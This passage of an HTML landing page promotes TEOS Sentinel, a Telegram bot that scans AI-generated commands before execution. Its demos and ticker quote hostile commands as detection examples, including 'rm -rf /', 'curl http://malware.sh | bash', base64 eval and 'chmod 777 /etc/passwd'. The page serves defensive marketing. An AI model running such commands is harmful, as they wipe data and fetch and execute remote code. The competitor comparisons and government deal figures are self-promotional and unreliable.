.rm-q.live-q { color:var(--turquoise); display:flex; align-items:center; gap:6px; }
.rm-dot {
  display:inline-block; width:6px; height:6px; border-radius:50%;
  background:var(--turquoise); box-shadow:0 0 6px var(--turquoise); animation:pulse 2s infinite;
}
.rm-title { font-family:var(--font-display); font-weight:700; font-size:13px; margin-bottom:8px; letter-spacing:0.04em; text-transform:uppercase; color:var(--alabaster); }
.rm-desc { font-family:var(--font-mono); font-size:11px; color:var(--alabaster-dim); line-height:1.7; }

/* ── FINAL CTA ── */
.final-cta {
  padding:160px 64px; text-align:center; position:relative; overflow:hidden;
}
.final-cta::before {
  content:''; position:absolute; top:50%; left:50%; transform:translate(-50%,-50%);
  width:900px; height:700px;
  background:radial-gradient(ellipse, rgba(212,168,67,0.08) 0%, rgba(30,77,140,0.04) 40%, transparent 70%);
  pointer-events:none;
}
.final-cta h2 {
  font-family:var(--font-display); font-weight:900; font-size:clamp(32px,5vw,68px);
  letter-spacing:0.05em; line-height:1.1; text-transform:uppercase;
  margin-bottom:20px; position:relative; color:var(--alabaster);
}
.final-cta h2 .gold { color:var(--gold); }
.final-cta p { font-family:var(--font-mono); font-size:13px; color:var(--alabaster-dim); max-width:480px; margin:0 auto 44px; line-height:1.9; position:relative; }
.final-btns { display:flex; justify-content:center; gap:14px; flex-wrap:wrap; position:relative; }

/* ── FOOTER ── */
footer { border-top:1px solid var(--border-1); background:var(--kohl-mid); }
footer::before {
  content:''; display:block; height:1px;
  background:linear-gradient(90deg, transparent, var(--gold-dim), var(--lapis-dim), var(--gold-dim), transparent);
}
.footer-inner {
  max-width:1300px; margin:0 auto; padding:64px 64px 44px;
  display:grid; grid-template-columns:2fr 1fr 1fr 1fr; gap:44px;
}
.foot-brand-name { font-family:var(--font-display); font-weight:700; font-size:14px; letter-spacing:0.1em; color:var(--gold); margin-bottom:14px; text-transform:uppercase; }
.foot-brand-desc { font-family:var(--font-mono); font-size:11px; color:var(--alabaster-dim); line-height:1.8; margin-bottom:16px; }
.foot-contact {
  font-family:var(--font-mono); font-size:11px; color:var(--gold-dim);
  text-decoration:none; border-bottom:1px solid var(--gold-dim); padding-bottom:1px; transition:color 0.2s;
}
.foot-contact:hover { color:var(--gold); }
.foot-col h5 { font-family:var(--font-display); font-size:9px; letter-spacing:0.18em; text-transform:uppercase; color:var(--alabaster-faint); margin-bottom:18px; }
.foot-col ul { list-style:none; }
.foot-col li { margin-bottom:10px; }
.foot-col a { font-family:var(--font-mono); font-size:11px; color:var(--alabaster-dim); text-decoration:none; transition:color 0.2s; }
.foot-col a:hover { color:var(--gold); }
.footer-bottom {
  max-width:1300px; margin:0 auto; padding:20px 64px;
  border-top:1px solid var(--border-1);
  display:flex; align-items:center; justify-content:space-between;
  font-family:var(--font-display); font-size:10px; color:var(--alabaster-faint);
  letter-spacing:0.08em; text-transform:uppercase; flex-wrap:wrap; gap:10px;
}

/* ── ANIMATIONS ── */
.reveal { opacity:0; transform:translateY(28px); transition:opacity 0.7s ease, transform 0.7s ease; }
.reveal.visible { opacity:1; transform:translateY(0); }
@keyframes fadeUp { from{opacity:0;transform:translateY(20px)} to{opacity:1;transform:translateY(0)} }

/* ── RTL ── */
[dir="rtl"] .nav-links { flex-direction:row-reverse; }
[dir="rtl"] .hero h1,[dir="rtl"] .hero-sub,[dir="rtl"] .section-title,
[dir="rtl"] .section-sub,[dir="rtl"] .feat-desc,[dir="rtl"] .step-desc,
[dir="rtl"] .rm-desc,[dir="rtl"] .gt-desc { direction:rtl; text-align:right; }

/* ── SCROLLBAR ── */
::-webkit-scrollbar { width:4px; }
::-webkit-scrollbar-track { background:var(--kohl); }
::-webkit-scrollbar-thumb { background:var(--border-2); border-radius:2px; }

/* ── RESPONSIVE ── */
@media(max-width:1024px){
  nav { padding:16px 28px; }
  .hero,.section-wrap,.sovereign-section,.final-cta { padding-left:28px; padding-right:28px; }
  .terminals { grid-template-columns:1fr; }
  .flow-steps { grid-template-columns:1fr 1fr; gap:40px; }
  .flow-steps::before { display:none; }
  .features-grid { grid-template-columns:1fr 1fr; }
  .pricing-grid { grid-template-columns:1fr; }
  .sovereign-section { grid-template-columns:1fr; gap:40px; }
  .roadmap-grid { grid-template-columns:1fr 1fr; }
  .engine-stats-inner { grid-template-columns:1fr 1fr; }
  .footer-inner { grid-template-columns:1fr 1fr; }
  .enterprise-row { flex-direction:column; align-items:flex-start; }
}
@media(max-width:640px){
  .nav-links { display:none; }
  .features-grid,.roadmap-grid { grid-template-columns:1fr; }
  .video-timeline { flex-direction:column; }
  .footer-inner { grid-template-columns:1fr; }
  .footer-bottom { flex-direction:column; }
  .trust-strip { gap:0; }
  .trust-item {
    border-right:none; border-bottom:1px solid var(--border-1);
    width:100%; justify-content:center; padding:16px;
  }
}
</style>
</head>
<body>

<!-- TRANSLATE PROGRESS BAR -->
<div class="translate-bar" id="translateBar"><div class="translate-bar-fill" id="translateFill"></div></div>
<div class="translate-toast" id="translateToast">
  <span id="toastFlag">𓂀</span>
  <span id="toastMsg">Translating...</span>
</div>

<!-- NAV -->
<nav>
  <a href="#" class="nav-brand">
    <div class="brand-ankh">𓂀</div>
    <span class="brand-name">TEOS Sentinel</span>
  </a>
  <ul class="nav-links">
    <li><a href="#demo">Demo</a></li>
    <li><a href="#features">Features</a></li>
    <li><a href="#compare">Compare</a></li>
    <li><a href="#government">Government</a></li>
    <li><a href="#pricing">Pricing</a></li>
    <li>
      <div class="lang-switcher" id="langSwitcher">
        <button class="lang-btn" id="langBtn" onclick="toggleLangMenu(event)">
          <span id="currentFlag">🌐</span>
          <span id="currentLangLabel">EN</span>
          <span class="lang-arrow">▼</span>
        </button>
        <div class="lang-dropdown" id="langDropdown">
          <button class="lang-option active" onclick="switchLang('en','🇺🇸','EN',false)" id="opt-en">
            <span class="lo-flag">🇺🇸</span><span>English</span><span class="lo-native">English</span>
          </button>
          <button class="lang-option" onclick="switchLang('ar','🇸🇦','AR',true)" id="opt-ar">
            <span class="lo-flag">🇸🇦</span><span>Arabic</span><span class="lo-native">العربية</span>
          </button>
          <button class="lang-option" onclick="switchLang('id','🇮🇩','ID',false)" id="opt-id">
            <span class="lo-flag">🇮🇩</span><span>Indonesian</span><span class="lo-native">Bahasa Indonesia</span>
          </button>
        </div>
      </div>
    </li>
    <li><a href="https://t.me/teoslinker_bot" class="nav-cta" target="_blank" rel="noopener noreferrer">Try Free →</a></li>
  </ul>
</nav>

<!-- STATUS BAR -->
<div class="status-bar">
  <div class="status-item"><div class="status-dot"></div> MCP Engine v2.0 — Online</div>
  <div class="status-item"><div class="status-dot"></div> Telegram Bot — Online</div>
  <div class="status-item"><div class="status-dot"></div> 25 Named Rules Active</div>
  <div class="status-item"><div class="status-dot"></div> 37 Tests Passing</div>
</div>

<!-- HERO -->
<section class="hero">
  <div class="hero-sun"></div>
  <div class="hero-rays"></div>
  <div class="egy-corner tl"></div>
  <div class="egy-corner tr"></div>
  <div class="egy-corner bl"></div>
  <div class="egy-corner br"></div>

  <div class="sovereignty-badge">
    <div class="status-dot"></div>
    Engine v2 Stable · Alexandria, Egypt · 75+ Nations
  </div>

  <h1>
    Your AI agent runs<br>
    <span class="strike">anything.</span><br>
    <span class="gold">We decide what executes.</span>
  </h1>

  <div class="hero-divider"></div>

  <p class="hero-sub">
    <strong>TEOS Sentinel Shield</strong> intercepts AI-generated commands,<br>
    scripts, and pipelines — and blocks threats <strong>before execution</strong>.<br>
    Not after the breach. Before.
  </p>

  <div class="hero-ctas">
    <a href="https://t.me/teoslinker_bot" class="btn-primary">𓂀 Scan Your First Command →</a>
    <a href="#video-demo" class="btn-secondary">Watch Demo ↓</a>
  </div>
  <p class="hero-micro">5 free scans · no signup · no credit card · Telegram instant</p>

  <div class="trust-strip">
    <div class="trust-item"><span class="trust-num" data-target="25">25</span>&nbsp;Named Rules</div>
    <div class="trust-item"><span class="trust-num" data-target="37">37</span>&nbsp;Tests Passing</div>
    <div class="trust-item"><span class="trust-num" data-target="75">75</span>+&nbsp;Nations</div>
    <div class="trust-item"><span class="trust-num" data-target="528">528</span>&nbsp;Community</div>
  </div>
</section>

<!-- THREAT TICKER -->
<div class="threat-ticker">
  <div class="ticker-inner">
    <span class="tick-item"><span class="tick-block">🛑 BLOCKED</span><span>rm -rf / · R01.DESTRUCTIVE_SHELL · 100/100</span></span>
    <span class="tick-item"><span class="tick-warn">⚠️ WARNED</span><span>DROP TABLE users; · R09.SQL_INJECTION · 75/100</span></span>
    <span class="tick-item"><span class="tick-allow">✅ ALLOWED</span><span>console.log("hello") · R00.CLEAN · 0/100</span></span>
    <span class="tick-item"><span class="tick-block">🛑 BLOCKED</span><span>curl http://malware.sh | bash · R03.CURL_EXEC · 95/100</span></span>
    <span class="tick-item"><span class="tick-block">🛑 BLOCKED</span><span>eval(atob("...")) · R07.BASE64_EXEC · 88/100</span></span>
    <span class="tick-item"><span class="tick-warn">⚠️ WARNED</span><span>event-stream@3.3.6 · R14.MALICIOUS_PKG · 70/100</span></span>
    <span class="tick-item"><span class="tick-allow">✅ ALLOWED</span><span>npm install lodash · R00.CLEAN · 0/100</span></span>
    <span class="tick-item"><span class="tick-block">🛑 BLOCKED</span><span>chmod 777 /etc/passwd · R02.CHMOD_ESC · 90/100</span></span>
    <!-- duplicate for seamless loop -->
    <span class="tick-item"><span class="tick-block">🛑 BLOCKED</span><span>rm -rf / · R01.DESTRUCTIVE_SHELL · 100/100</span></span>
    <span class="tick-item"><span class="tick-warn">⚠️ WARNED</span><span>DROP TABLE users; · R09.SQL_INJECTION · 75/100</span></span>
    <span class="tick-item"><span class="tick-allow">✅ ALLOWED</span><span>console.log("hello") · R00.CLEAN · 0/100</span></span>
    <span class="tick-item"><span class="tick-block">🛑 BLOCKED</span><span>curl http://malware.sh | bash · R03.CURL_EXEC · 95/100</span></span>
    <span class="tick-item"><span class="tick-block">🛑 BLOCKED</span><span>eval(atob("...")) · R07.BASE64_EXEC · 88/100</span></span>
    <span class="tick-item"><span class="tick-warn">⚠️ WARNED</span><span>event-stream@3.3.6 · R14.MALICIOUS_PKG · 70/100</span></span>
    <span class="tick-item"><span class="tick-allow">✅ ALLOWED</span><span>npm install lodash · R00.CLEAN · 0/100</span></span>
    <span class="tick-item"><span class="tick-block">🛑 BLOCKED</span><span>chmod 777 /etc/passwd · R02.CHMOD_ESC · 90/100</span></span>
  </div>
</div>

<!-- VIDEO DEMO -->
<section id="video-demo">
  <div class="section-wrap">
    <div class="section-label reveal">Live Demo</div>
    <h2 class="section-title reveal">See TEOS block a real threat<br><span class="gold">in under 2 seconds.</span></h2>
    <p class="section-sub reveal">Open Telegram. Paste a dangerous command. Get BLOCK verdict before execution. Zero config. Zero signup.</p>

    <div class="video-wrapper reveal">
      <!--
        VIDEO SETUP:
        1. Copy your MP4 into /public/demo.mp4 in your Next.js project root
        2. The <video> tag below will serve it automatically
        To swap to YouTube/Loom embed instead, replace the <video> tag with:
          <iframe width="100%" style="aspect-ratio:16/9" src="https://www.youtube.com/embed/YOUR_ID" frameborder="0" allowfullscreen></iframe>
      -->
      <video controls preload="metadata" style="width:100%;display:block;background:var(--kohl-mid)">
        <source src="/demo.mp4" type="video/mp4">
        Your browser does not support the video tag.
      </video>
      <div class="video-timeline">
        <div class="vt-step">
          <div class="vt-time">0:00 – 0:15</div>
          <div class="vt-label">Open <span class="vt-code">@teoslinker_bot</span></div>
        </div>
        <div class="vt-step">
          <div class="vt-time">0:15 – 0:35</div>
          <div class="vt-label">Send <span class="vt-code">/scan rm -rf /</span> → BLOCK</div>
        </div>
        <div class="vt-step">
          <div class="vt-time">0:35 – 0:50</div>
          <div class="vt-label">Send <span class="vt-code">/scan console.log("ok")</span> → ALLOW</div>
        </div>
        <div class="vt-step">
          <div class="vt-time">0:50 – 1:00</div>
          <div class="vt-label">Show <span class="vt-code">/status</span> + credits</div>
        </div>
      </div>
    </div>
  </div>
</section>

<!-- LIVE TERMINALS -->
<section id="demo">
  <div class="section-wrap">
    <div class="section-label reveal">Live Verdicts</div>
    <h2 class="section-title reveal">Three commands.<br><span class="gold">Three verdicts. Instant.</span></h2>
    <p class="section-sub reveal">Every scan returns a risk score, a rule ID, and a human-readable explanation. No dashboards. No config.</p>
    <div class="terminals reveal">
      <div class="term">
        <div class="term-bar">
          <div class="td td-r"></div><div class="td td-y"></div><div class="td td-g"></div>
          <span class="term-tag">Threat Blocked</span>
        </div>
        <div class="term-body">
          <div><span class="tp">›</span> <span class="tc">/scan rm -rf /</span></div>
          <div class="tmt">analyzing command...</div>
          <div>&nbsp;</div>
          <div class="tbl">🛑 BLOCK — 100/100</div>
          <div class="tsc">Rule: R01.DESTRUCTIVE_SHELL</div>
          <div class="tr">↳ rm -rf permanently deletes all files.</div>
          <div class="tr">↳ Wiper malware signature detected.</div>
          <div class="tr">↳ Execution prevented.</div>
          <div>&nbsp;</div>
          <div class="tmt">Credit not consumed.</div>
        </div>
        <div class="term-verdict">
          <span class="verdict-pill v-block">BLOCK</span>
          <span class="verdict-rule">R01 · score 100</span>
        </div>
      </div>
      <div class="term">
        <div class="term-bar">
          <div class="td td-r"></div><div class="td td-y"></div><div class="td td-g"></div>
          <span class="term-tag">Warn Raised</span>
        </div>
        <div class="term-body">
          <div><span class="tp">›</span> <span class="tc">/scan DROP TABLE users;</span></div>
          <div class="tmt">analyzing command...</div>
          <div>&nbsp;</div>
          <div class="twn">⚠️ WARN — 75/100</div>
          <div class="tsc">Rule: R09.SQL_INJECTION</div>
          <div class="tr">↳ DROP TABLE destroys database tables.</div>
          <div class="tr">↳ SQL injection risk detected.</div>
          <div class="tr">↳ Human review recommended.</div>
          <div>&nbsp;</div>
          <div class="tmt">Credits left: 997</div>
        </div>
        <div class="term-verdict">
          <span class="verdict-pill v-warn">WARN</span>
          <span class="verdict-rule">R09 · score 75</span>
        </div>
      </div>
      <div class="term">
        <div class="term-bar">
          <div class="td td-r"></div><div class="td td-y"></div><div class="td td-g"></div>
          <span class="term-tag">Allow Passed</span>
        </div>
        <div class="term-body">
          <div><span class="tp">›</span> <span class="tc">/scan console.log("hello")</span></div>
          <div class="tmt">analyzing command...</div>
          <div>&nbsp;</div>
          <div class="tok">✅ ALLOW — 0/100</div>
          <div class="tsc">Rule: R00.CLEAN</div>
          <div class="tr">↳ No destructive patterns detected.</div>
          <div class="tr">↳ No injection vectors identified.</div>
          <div class="tr">↳ Safe to execute.</div>
          <div>&nbsp;</div>
          <div class="tmt">Credits left: 996</div>
        </div>
        <div class="term-verdict">
          <span class="verdict-pill v-allow">ALLOW</span>
          <span class="verdict-rule">R00 · score 0</span>
        </div>
      </div>
    </div>
  </div>
</section>

<!-- ENGINE STATS -->
<div class="engine-stats-section">
  <div class="engine-stats-inner">
    <div class="estat">
      <div class="estat-num" data-target="25">25</div>
      <div class="estat-label">Named Rules</div>
      <div class="estat-sub">R01 – R25 active</div>
    </div>
    <div class="estat">
      <div class="estat-num" data-target="37">37</div>
      <div class="estat-label">Tests Passing</div>
      <div class="estat-sub">Engine v2 stable</div>
    </div>
    <div class="estat">
      <div class="estat-num" data-target="3">3</div>
      <div class="estat-label">Services Online</div>
      <div class="estat-sub">MCP · Bot · Activation</div>
    </div>
    <div class="estat">
      <div class="estat-num">v2.0</div>
      <div class="estat-label">Engine Version</div>
      <div class="estat-sub">Production stable</div>
    </div>
  </div>
</div>

<!-- HOW IT WORKS -->
<section id="how">
  <div class="section-wrap">
    <div class="section-label reveal">Architecture</div>
    <h2 class="section-title reveal">Generate → Validate → <span class="gold">Execute</span></h2>
    <p class="section-sub reveal">TEOS inserts a deterministic checkpoint between AI generation and runtime. Every command. Every time. No exceptions.</p>
    <div class="flow-steps reveal">
      <div class="flow-step">
        <div class="step-n">01</div>
        <div class="step-ti">Send Command</div>
        <p class="step-desc">Paste any code, shell command, dependency list, or CI/CD step into Telegram. No account. No SDK. No backend changes required.</p>
      </div>
      <div class="flow-step">
        <div class="step-n">02</div>
        <div class="step-ti">Engine Analyzes</div>
        <p class="step-desc">25 named rules scan against wiper patterns, eval/exec abuse, injection vectors, secret exposure, known malicious packages, and unsafe CI permissions.</p>
      </div>
      <div class="flow-step">
        <div class="step-n">03</div>
        <div class="step-ti">Verdict Returned</div>
        <p class="step-desc">BLOCK, WARN, or ALLOW — with a rule ID, risk score 0–100, and full human-readable explanation. Structured output your agent can act on immediately.</p>
      </div>
      <div class="flow-step">
        <div class="step-n">04</div>
        <div class="step-ti">Audit Logged</div>
        <p class="step-desc">Every decision recorded. Credits consumed only on clean passes — blocked threats cost nothing. Full audit trail for enterprise and government compliance.</p>
      </div>
    </div>
  </div>
</section>

<!-- FEATURES -->
<div class="features-bg" id="features">
  <div class="section-wrap" style="padding-top:0;padding-bottom:0;">
    <div class="section-label reveal">Scan Engines</div>
    <h2 class="section-title reveal">Three engines.<br><span class="gold">One interface.</span></h2>
    <p class="section-sub reveal">All via @teoslinker_bot on Telegram. Zero dashboards. Zero config. Instant verdicts.</p>
    <div class="features-grid reveal">
      <div class="feat">
        <div class="feat-icon">🛡️</div>
        <div class="feat-cmd">/scan &lt;code&gt;</div>
        <div class="feat-title">Pre-Execution Code Scan</div>
        <p class="feat-desc">Analyzes shell commands, scripts, and code against 10+ threat categories: wiper patterns, eval/exec abuse, command injection, chmod escalation, secret leakage, base64 execution chains.</p>
        <div class="feat-tags"><span class="ftag">rm -rf</span><span class="ftag">eval()</span><span class="ftag">curl|bash</span><span class="ftag">DROP TABLE</span><span class="ftag">chmod 777</span></div>
      </div>
      <div class="feat">
        <div class="feat-icon">📦</div>
        <div class="feat-cmd">/deps &lt;package.json&gt;</div>
        <div class="feat-title">Supply Chain Audit</div>
        <p class="feat-desc">Scans npm manifests against 14+ known compromised packages — event-stream, ua-parser-js, node-ipc, and more. Pre-install. Not post-incident. Not post-breach.</p>
        <div class="feat-tags"><span class="ftag">event-stream</span><span class="ftag">node-ipc</span><span class="ftag">ua-parser-js</span><span class="ftag">lodash CVE</span></div>
      </div>
      <div class="feat">
        <div class="feat-icon">⚙️</div>
        <div class="feat-cmd">/ci &lt;pipeline&gt;</div>
        <div class="feat-title">CI/CD Hardening</div>
        <p class="feat-desc">Scans GitHub Actions YAML, Dockerfiles, and pipeline configs for write-all permissions, secret exposure, curl|bash execution, privileged containers, and enterprise misconfigs.</p>
        <div class="feat-tags"><span class="ftag">write-all</span><span class="ftag">secrets</span><span class="ftag">--privileged</span><span class="ftag">curl|bash</span></div>
      </div>
      <div class="feat">
        <div class="feat-icon">✈️</div>
        <div class="feat-cmd">@teoslinker_bot</div>
        <div class="feat-title">Telegram-Native Gateway</div>
        <p class="feat-desc">Zero-friction via Telegram. Commands: /scan, /deps, /ci, /status, /upgrade, /credits. No SDK, no account setup. Works in 60 seconds from first message.</p>
        <div class="feat-tags"><span class="ftag">zero-signup</span><span class="ftag">5 free scans</span><span class="ftag">instant</span></div>
      </div>
      <div class="feat">
        <div class="feat-icon">📊</div>
        <div class="feat-cmd">/status · /credits</div>
        <div class="feat-title">Credits &amp; Audit Trail</div>
        <p class="feat-desc">Credits tracked per user. Consumed only on clean passes — blocked threats are free. Upgrade tiers unlock higher limits. Full audit logs for compliance and government teams.</p>
        <div class="feat-tags"><span class="ftag">per-scan</span><span class="ftag">auto credits</span><span class="ftag">audit logs</span></div>
      </div>
      <div class="feat">
        <div class="feat-icon">🏛️</div>
        <div class="feat-cmd">Sovereign Deployment</div>
        <div class="feat-title">Enterprise / Government</div>
        <p class="feat-desc">Dedicated instance for governments and regulated industries. Custom threat policy engine, ICBC constitutional alignment, MENA-sovereign architecture, SLA guarantee.</p>
        <div class="feat-tags"><span class="ftag">self-hosted</span><span class="ftag">custom rules</span><span class="ftag">ICBC aligned</span><span class="ftag">SLA</span></div>
      </div>
    </div>
  </div>
</div>

<!-- COMPARE -->
<section id="compare">
  <div class="section-wrap">
    <div class="section-label reveal">Competitive Edge</div>
    <h2 class="section-title reveal">The only <span class="gold">pre-execution</span> layer.</h2>
    <p class="section-sub reveal">GitGuardian, Snyk, Checkmarx — all scan post-commit. TEOS blocks before your agent runs the command. Different threat model entirely.</p>
    <table class="compare-table reveal">
      <thead>
        <tr>
          <th>Capability</th>
          <th class="ours">𓂀 TEOS Sentinel</th>
          <th>GitGuardian</th>
          <th>Snyk</th>
          <th>Checkmarx</th>
        </tr>
      </thead>
      <tbody>
        <tr><td>Pre-execution blocking</td><td class="ours"><span class="cy">✅ Yes</span></td><td><span class="cn">❌ Post-commit</span></td><td><span class="cn">❌ Post-commit</span></td><td><span class="cn">❌</span></td></tr>
        <tr><td>Telegram-native UX</td><td class="ours"><span class="cy">✅ Yes</span></td><td><span class="cn">❌</span></td><td><span class="cn">❌</span></td><td><span class="cn">❌</span></td></tr>
        <tr><td>Free tier (no signup)</td><td class="ours"><span class="cy">✅ 5 free scans</span></td><td><span class="cn">❌</span></td><td><span class="cp">⚠️ Limited</span></td><td><span class="cn">❌ Enterprise</span></td></tr>
        <tr><td>Shell command scanning</td><td class="ours"><span class="cy">✅ R01–R08</span></td><td><span class="cn">❌</span></td><td><span class="cn">❌</span></td><td><span class="cp">⚠️ Limited</span></td></tr>
        <tr><td>Dependency CVE audit</td><td class="ours"><span class="cy">✅ Builder+</span></td><td><span class="cy">✅</span></td><td><span class="cy">✅</span></td><td><span class="cy">✅</span></td></tr>
        <tr><td>CI/CD pipeline scan</td><td class="ours"><span class="cy">✅ Yes</span></td><td><span class="cp">⚠️ Partial</span></td><td><span class="cp">⚠️ Partial</span></td><td><span class="cy">✅</span></td></tr>
        <tr><td>MENA sovereign focus</td><td class="ours"><span class="cy">✅ Yes</span></td><td><span class="cn">❌</span></td><td><span class="cn">❌</span></td><td><span class="cn">❌</span></td></tr>
        <tr><td>AI agent native design</td><td class="ours"><span class="cy">✅ Yes</span></td><td><span class="cn">❌</span></td><td><span class="cn">❌</span></td><td><span class="cn">❌</span></td></tr>
      </tbody>
    </table>
  </div>
</section>

<!-- GOVERNMENT -->
<div class="features-bg" id="government">
  <div class="section-wrap" style="padding-top:0;padding-bottom:0;">
    <div class="section-label reveal">Government Pipeline</div>
    <h2 class="section-title reveal">MENA is buying<br><span class="gold">AI governance.</span></h2>
    <p class="section-sub reveal">Egypt, UAE, and Saudi Arabia are actively investing in AI execution control. TEOS is the enforcement layer they are missing.</p>

    <div class="gov-tabs reveal">
      <button class="gov-tab active" onclick="setGov(this,'eg')">🇪🇬 Egypt — Start Here</button>
      <button class="gov-tab" onclick="setGov(this,'ae')">🇦🇪 UAE — Fast Track</button>
      <button class="gov-tab" onclick="setGov(this,'sa')">🇸🇦 Saudi — Big Contracts</button>
    </div>

    <div id="gov-eg" class="gov-panel active reveal">
      <div class="gov-target t1">
        <div class="gov-copy">
          <div class="gt-tier">Tier 1 — Direct Buyer</div>
          <div class="gt-name">ITIDA</div>
          <div class="gt-angle">"Execution control layer for Egypt's AI ecosystem"</div>
          <p class="gt-desc">Core ICT + startup + AI ecosystem driver. Manages national tech growth and digital economy programs. Actively supports AI adoption across startup pipelines and DevSecOps training.</p>
        </div>
        <div class="gt-deal">Pilot<br>$5K–$10K</div>
      </div>
      <div class="gov-target t1">
        <div class="gov-copy">
          <div class="gt-tier">Tier 1 — Direct Buyer</div>
          <div class="gt-name">MCIT</div>
          <div class="gt-angle">"Pre-execution enforcement layer for national AI systems"</div>
          <p class="gt-desc">Ministry of Communications and IT. Owns Egypt's AI strategy 2025–2030. Controls digital transformation programs. Infrastructure, governance, and real-world AI systems are their mandate.</p>
        </div>
        <div class="gt-deal">Strategic<br>$10K–$25K</div>
      </div>
      <div class="gov-target t2">
        <div class="gov-copy">
          <div class="gt-tier">Tier 2 — Entry via Pilot</div>
          <div class="gt-name">TIEC + Smart Cities</div>
          <div class="gt-angle">"AI execution control for smart city systems"</div>
          <p class="gt-desc">Technology Innovation &amp; Entrepreneurship Center (under ITIDA) for startup integration. Administrative Capital for Urban Development — smart city AI systems. Easiest first deal. Start here.</p>
        </div>
        <div class="gt-deal">Entry<br>$3K–$8K</div>
      </div>
    </div>

    <div id="gov-ae" class="gov-panel reveal">
      <div class="gov-target t1">
        <div class="gov-copy">
          <div class="gt-tier">Tier 1 — Highest Priority</div>
          <div class="gt-name">UAE AI Office</div>
          <div class="gt-angle">"Policy enforcement layer for AI execution"</div>
          <p class="gt-desc">National AI leadership. Sets strategy and adoption across all government entities. Policy enforcement layer for AI execution is exactly their mandate. Direct institutional buyer.</p>
        </div>
        <div class="gt-deal">Pilot<br>$10K–$25K</div>
      </div>
      <div class="gov-target t1">
        <div class="gov-copy">
          <div class="gt-tier">Tier 1 — Partner Route</div>
          <div class="gt-name">G42 + Injazat</div>
          <div class="gt-angle">"Infrastructure layer integration"</div>
          <p class="gt-desc">G42: national-scale AI infrastructure with direct government relationships. Injazat: government + enterprise digital transformation. Both operate at the infrastructure layer — your category.</p>
        </div>
        <div class="gt-deal">Partnership<br>$15K–$50K</div>
      </div>
      <div class="gov-target t2">
        <div class="gov-copy">
          <div class="gt-tier">Tier 1 — Regulatory</div>
          <div class="gt-name">TDRA</div>
          <div class="gt-angle">"AI execution compliance layer"</div>
          <p class="gt-desc">Telecommunications and Digital Government Regulatory Authority. Digital government + compliance regulation. Execution control and compliance audit trail are core to their regulatory remit.</p>
        </div>
        <div class="gt-deal">Regulatory<br>$8K–$20K</div>
      </div>
    </div>

    <div id="gov-sa" class="gov-panel reveal">
      <div class="gov-target t1">
        <div class="gov-copy">
          <div class="gt-tier">Tier 1 — Critical Target</div>
          <div class="gt-name">SDAIA</div>
          <div class="gt-angle">"Execution enforcement for AI governance"</div>
          <p class="gt-desc">Saudi Data and Artificial Intelligence Authority. Central AI + data authority. Controls AI strategy and data governance. Core pillars of Vision 2030. Direct match to your product category.</p>
        </div>
        <div class="gt-deal">Major Pilot<br>$25K–$50K+</div>
      </div>
      <div class="gov-target t1">
        <div class="gov-copy">
          <div class="gt-tier">Tier 2 — Perfect Fit</div>
          <div class="gt-name">NEOM</div>
          <div class="gt-angle">"Kill-switch for autonomous environments"</div>
          <p class="gt-desc">AI-native city. Autonomous systems everywhere. Every autonomous decision needs a kill-switch before execution. NEOM is the single best product-market fit for TEOS in the world.</p>
        </div>
        <div class="gt-deal">Enterprise<br>$50K–$200K</div>
      </div>
      <div class="gov-target t2">
        <div class="gov-copy">
          <div class="gt-tier">Tier 2 — Enterprise Entry</div>
          <div class="gt-name">STC / STC Solutions</div>
          <div class="gt-angle">"Enterprise AI execution control"</div>
          <p class="gt-desc">Saudi Telecom Company. Smart cities, enterprise AI, major government contracts. Established procurement channel. Enterprise entry → government expansion route.</p>
        </div>
        <div class="gt-deal">Entry<br>$10K–$30K</div>
      </div>
    </div>

    <div class="outreach-box reveal">
      <div class="ob-title">// Exact Outreach Language — Use This</div>
      <div class="ob-script">
        We provide a <strong>pre-execution enforcement layer</strong> for AI systems.<br>
        It ensures unsafe commands are <span class="danger">blocked before execution</span> — enabling compliance, control, and auditability across AI workflows.<br>
        We are onboarding a limited number of <span class="safe">government pilots in MENA.</span><br><br>
        <span style="color:var(--alabaster-faint);">Never say: bot / scanner / SaaS. Always say: execution control layer / sovereign AI infrastructure.</span>
      </div>
    </div>
  </div>
</div>

<!-- PRICING -->
<div class="pricing-bg" id="pricing">
  <div class="section-wrap" style="padding-top:0;padding-bottom:0;">
    <div class="section-label reveal">Plans</div>
    <h2 class="section-title reveal">Stay protected.<br><span class="gold">Choose your level.</span></h2>
    <p class="section-sub reveal">Instant activation. Credits auto-applied. Cancel anytime. Full rule ID + explanation on every verdict.</p>
    <div class="pricing-grid reveal">
      <div class="plan">
        <div class="plan-name">🟦 Starter</div>
        <div class="plan-price"><span class="price-n">$9</span><span class="price-p">/month</span></div>
        <p class="plan-tag">For hobbyists and early testing</p>
        <ul class="plan-feats">
          <li>50 protected actions/month</li>
          <li>Code threat scanning (/scan)</li>
          <li>Full verdict + rule ID</li>
          <li>Community support</li>
          <li>7-day money-back</li>
        </ul>
        <a href="https://dodo.pe/tts" class="btn-plan btn-out">Get Started →</a>
      </div>
      <div class="plan pop">
        <div class="pop-badge">⭐ Most Popular</div>
        <div class="plan-name">🟨 Builder</div>
        <div class="plan-price"><span class="price-n">$39</span><span class="price-p">/month</span></div>
        <p class="plan-tag">For indie devs and startups</p>
        <ul class="plan-feats">
          <li>400 protected actions/month</li>
          <li>Code + Dependency scanning</li>
          <li>CI/CD pipeline audit</li>
          <li>Priority analysis queue</li>
          <li>Full verdict + rule explanations</li>
          <li>7-day money-back</li>
        </ul>
        <a href="https://dodo.pe/tts2" class="btn-plan btn-gold">Get Protected →</a>
      </div>
      <div class="plan">
        <div class="plan-name">🟥 Pro</div>
        <div class="plan-price"><span class="price-n">$99</span><span class="price-p">/month</span></div>
        <p class="plan-tag">For teams and production agents</p>
        <ul class="plan-feats">
          <li>1,000 protected actions/month</li>
          <li>All scanning engines</li>
          <li>Advanced threat detection</li>
          <li>SLA support + early access</li>
          <li>Custom policy rules</li>
          <li>Full audit logs</li>
        </ul>
        <a href="https://dodo.pe/teos-pro" class="btn-plan btn-out">Go Pro →</a>
      </div>
    </div>
    <div class="enterprise-row reveal">
      <div>
        <div class="ent-h">🏢 Enterprise / Government Pilot</div>
        <p class="ent-p">Dedicated deployment · Custom policy engine · Audit logs · MENA sovereign architecture · ICBC alignment · Self-hosted · Egypt / UAE / Saudi pilots open now</p>
      </div>
      <a href="mailto:ayman@teosegypt.com" class="btn-ent">Request Pilot ($5K–$50K) →</a>
    </div>
  </div>
</div>

<!-- SOVEREIGN -->
<div class="sovereign-section">
  <div class="sovereign-copy reveal">
    <div class="section-label">Built Different</div>
    <h2>From <span class="gold">Alexandria.</span><br>For sovereign AI.</h2>
